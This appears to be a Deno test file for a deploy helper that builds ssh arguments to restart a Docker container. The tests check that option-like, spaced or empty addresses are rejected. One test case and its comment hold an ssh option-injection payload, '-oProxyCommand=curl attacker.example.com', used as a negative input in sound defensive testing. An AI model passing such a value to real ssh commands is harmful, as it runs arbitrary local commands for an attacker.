// Tests for stacks/gatus/after.deploy.ts's pure helper.
// (No shell interaction — that runs via the deploy script.)

import { assertEquals, assertThrows } from "@std/assert"
import { buildRestartCommand } from "./after.deploy.ts"

Deno.test("buildRestartCommand: valid address — '--' precedes the address", () => {
  const args = buildRestartCommand("user@192.0.2.10", "hl-gatus")
  assertEquals(args, ["--", "user@192.0.2.10", "docker", "restart", "hl-gatus"])
})

Deno.test("buildRestartCommand: an ssh_config alias is accepted", () => {
  const args = buildRestartCommand("home", "hl-gatus")
  assertEquals(args, ["--", "home", "docker", "restart", "hl-gatus"])
})

Deno.test("buildRestartCommand: rejects a value starting with '-'", () => {
  // Without the "--" guard and this check, ssh would read this as an
  // option: "-oProxyCommand=curl attacker.example.com" runs a local
  // command as part of ssh's own option parsing, no shell involved.
  assertThrows(
    () => buildRestartCommand("-oProxyCommand=curl attacker.example.com", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a bare '-flag'", () => {
  assertThrows(
    () => buildRestartCommand("--", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a value with a space", () => {
  assertThrows(
    () => buildRestartCommand("host with space", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects an empty string", () => {
  assertThrows(
    () => buildRestartCommand("", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})
